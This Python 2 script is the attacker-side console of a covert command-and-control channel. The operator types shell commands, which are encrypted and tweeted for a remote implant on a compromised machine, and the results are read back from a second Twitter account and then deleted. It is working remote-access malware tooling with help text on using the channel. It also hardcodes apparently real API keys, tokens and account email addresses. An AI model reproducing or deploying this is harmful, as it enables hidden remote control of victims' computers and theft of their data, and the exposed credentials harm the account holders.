#Attacker runs this on their computer 

import tweepy
from newEncrypt import *
import os 
from time import sleep

#Twitter account for this API instance: lbwbchigh@yahoo.com
#This is the Twitter page the implant checks for commands 
consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)

#Twitter account for this API instance: krazykatphoenix@yahoo.com
#This is the Twitter page the implant posts command responses to
consumer_key = 'CEkMw02DlRrM7iFdsadhuAGWz'
consumer_secret = 'A3VVGro2sy2A0SSYLx3hD1Q4IFpa0lsobUKQ0HyAN5z6FZMf1X'
access_token = '701149655468527616-CznesGkPJEqyHGjtJTauqKPtUH9O2XJ'
access_token_secret = 'H4u8EiOe5THE8lPt51Oy4AxLyoleTpugEXIDqRbnRT5Ac'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
apiTwo = tweepy.API(auth)

#This prints how many API calls remain for the implant to access the Twitter page containing commands
#and makes the implant sleep when only four API calls remain.
#This means the implant can check Twitter 176 times before it sleeps 				   
def limit():
	data = api.rate_limit_status()
	value = str(data['resources']['statuses']['/statuses/user_timeline'])
	if (len(value) == 55):
		almost = value[-3:]
		remain= almost[:2]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)
	else:
		almost = value[-4:]
		remain= almost[:3]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)
			
#This function helps attackers learn how to use the channel			
def help():

	print '\n'
	print "***HOW TO USE***"
	print '\n'
	print "\t Simply enter terminal commands and wait for responses."
	print "\n"
	print "\t In order to exit the channel, type 'exit' "
	print '\n'
	print "\t If you need help, type 'help'"
	print '\n'
	print "\t You can make the implant side sleep by entering 'sleep # of seconds' "
	print '\n'
	
	print "***TROUBLE SHOOTING***"
	print "\n"
	print "\t 1.  Some commands take longer to process than others."	
	print "\t Most commands will take less than ten seconds to process."
	print '\n'
	print "\t 2.  After every 175 Twitter API calls, the channel will sleep"
	print "\t for sixteen minutes. Remember to montitor how many API calls you have"
	print "\t remaining before the channel sleeps. This is displayed "
	print "\t below the command prompt after every command is executed."
	print '\n'
	print "\t 3.  Response sizes are limited by the Twitter API."
	print "\t It is therefore diffuclt to use large search commands "
	print "\t such as 'ls'. Instead, use more specific search commands"
	print "\t such as 'grep' to find the information you are looking for."
	print "\n"
	print "\t 4.  Sometimes 'cd ..' and 'sleep # of seconds' will lead to an error "
	print "\t message when no error has ocurred. Just enter 'pwd' to confirm 'cd ..' "
	print "\t worked. "
	print '\n'	
	print "\t 5.  If a command receives no response or an incorrect response,"
	print "\t you encountered a timing problem. Simply re-enter your comand."
	print '\n'	
	print "\t 6.  Sometimes you will receive resposnes for old "
	print "\t commands unexpetededly, several commands after you"
	print "\t entered it. Simply keep using the channel as nornmal."
	print "\n"
	print "\t 7.  Reset the channel by manually deleting the tweets " 
	print "\t from both Twitter pages. Especially do this is if you continue "
	print "\t to get unexpected responses. You likely have a timing issue."
	print '\n'
	print "\t 8.  Responses that end with '*' mean the response was cut off "
	print "\t because Twitter API constraints and encryption padding limits  "
	print "\t responses to 47 chracters. Overcome this by viewing responses one small "
	print "\t piece at a time by specifying line numbers in commands. "
	print '\n'
	 
	
		
#Main loop					   
if __name__ == "__main__":
	while True:
	 	flag = 0
	 	while (flag == 0):
			var = raw_input("twitter_attack$ ")
			msg = encode(var)
			if (len(msg) <= 140):
				flag = 1
			else:
				print '\n'
				print 'Error. Make sure the command you enter contains no more than 47 characters.'
				print '\n'
				
		if var == "exit":
			print "You have closed the attack shell. Manually delete tweets from Twitter pages."
			break
			
		elif var == "help":	
			help()
		else: 
			#Post encrypted command to Twitter
			api.update_status(msg)
			sleep(5)
			#Get command response from Twitter
			new_public_tweets = apiTwo.user_timeline('krazykatphoenix')
			limit()
			
			for tweet in new_public_tweets:
				test = str(tweet.text)
				bytes = str.encode(test)
				type(bytes)	
				mess = decode(bytes)
				print mess
				#Delete command response from Twitter 
				apiTwo.destroy_status(tweet.id)
				break
				
			
		
		
	
